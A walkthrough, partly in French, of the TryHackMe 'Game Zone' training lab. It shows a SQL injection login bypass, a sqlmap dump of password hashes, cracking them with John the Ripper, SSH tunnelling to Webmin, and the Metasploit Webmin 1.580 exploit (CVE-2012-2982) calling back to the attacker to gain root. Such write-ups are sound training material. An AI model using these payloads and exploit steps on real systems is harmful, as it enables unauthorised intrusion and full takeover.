# Game Zone
> Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!

https://tryhackme.com/room/gamezone


10.10.84.238



Hitman => https://en.wikipedia.org/wiki/Agent_47

> Réponse : **agent 47**

## Test injection SQL  sur le login/password 

```
' OR 1=1
```
=> failed

```
' OR 1=1 -- -
```

=> OK

> Réponse : **portal.php**

## SQLMap

Récupération de la requete HTTP de recherche via Burpsuite

```
POST /portal.php HTTP/1.1
Host: 10.10.74.121
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.74.121/portal.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Connection: close
Cookie: PHPSESSID=vabciqtup7h0sokh1mm2l3jnp5
Upgrade-Insecure-Requests: 1

searchitem=test
```

```sh
sqlmap -r request.txt --dbms=mysql --dump
```

### #1 In the users table, what is the hashed password?

```sql
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+
```

> Réponse : **ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14**

### #2 What was the username associated with the hashed password?

> Réponse : **agent47**

### #3 What was the other table name?


```
Database: db
Table: post
[5 entries]
+------+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id   | name                           | description                                                                                                                                                                                            |
+------+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 4    | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 1    | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 5    | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
| 2    | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3    | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
+------+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
```

> Réponse: **post**

## [Task 4] Cracking a password with JohnTheRipper

```
root@kali:/home/kali/thm/gamezone# echo "ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14" > agent47.hash
root@kali:/home/kali/thm/gamezone# john --wordlist=/opt/rockyou.txt  --format=Raw-SHA256 agent47.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
videogamer124    (?)
1g 0:00:00:00 DONE (2020-06-21 15:37) 5.263g/s 15349Kp/s 15349Kc/s 15349KC/s vimivera..veluasan
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed
```


### #2 What is the de-hashed password?

> Réponse : **videogamer124**

### #3 What is the user flag?

```
kali@kali:~/thm/gamezone$ ssh agent47@10.10.74.121
The authenticity of host '10.10.74.121 (10.10.74.121)' can't be established.
ECDSA key fingerprint is SHA256:mpNHvzp9GPoOcwmWV/TMXiGwcqLIsVXDp5DvW26MFi8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.74.121' (ECDSA) to the list of known hosts.
agent47@10.10.74.121's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.

Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147

agent47@gamezone:~$ id
uid=1000(agent47) gid=1000(agent47) groups=1000(agent47),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

agent47@gamezone:~$ cat user.txt 
649ac17b1480ac13ef1e4fa579dac95c
```

> Réponse: **649ac17b1480ac13ef1e4fa579dac95c**

## [Task 5] Exposing services with reverse SSH tunnels

```sh
agent47@gamezone:~$ ss -tulpn
Netid State      Recv-Q Send-Q                      Local Address:Port                                     Peer Address:Port              
udp   UNCONN     0      0                                       *:10000                                               *:*                  
udp   UNCONN     0      0                                       *:68                                                  *:*                  
tcp   LISTEN     0      80                              127.0.0.1:3306                                                *:*                  
tcp   LISTEN     0      128                                     *:10000                                               *:*                  
tcp   LISTEN     0      128                                     *:22                                                  *:*                  
tcp   LISTEN     0      128                                    :::80                                                 :::*                  
tcp   LISTEN     0      128                                    :::22                                                 :::*                  
```

```sh
agent47@gamezone:~$ netstat -plunt
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:10000           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
udp        0      0 0.0.0.0:10000           0.0.0.0:*                           -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -   
```

### How many TCP sockets are running?

> Réponse: **5**

Le serveur herbege d'autres services mais non accèssible depuis l'extérieur.

Création d'un tunnel SSH pour accéder au service qui écoute sur le port 10000, probablement webmin.

```
ssh -L 10000:localhost:10000 agent47@10.10.74.121
```

### What is the name of the exposed CMS?

> Réponse: **webmin**


kali@kali:~/thm/gamezone$ curl -v http://localhost:10000
(...)
< HTTP/1.0 200 Document follows
< Date: Sun, 21 Jun 2020 19:55:38 GMT
< Server: MiniServ/1.580

### What is the CMS version?

> Réponse: **1.580**



https://www.exploit-db.com/exploits/21851
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)

CVE-2012-2982

```
msf5 > search webmin
(...)
4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution

msf5 > use exploit/unix/webapp/webmin_show_cgi_exec
msf5 exploit(unix/webapp/webmin_show_cgi_exec) > options

Module options (exploit/unix/webapp/webmin_show_cgi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   yes       Webmin Password
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     10000            yes       The target port (TCP)
   SSL       true             yes       Use SSL
   USERNAME                   yes       Webmin Username
   VHOST                      no        HTTP server virtual host

```

```
set USERNAME agent47
set PASSWORD videogamer124
set RHOSTS 127.0.0.1
set RPORT 10000
set SSL false
set LHOST 10.9.11.184
exploit
```

```
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
root.txt
cat /root/root.txt
a4b945830144bdd71908d12d902adeee
```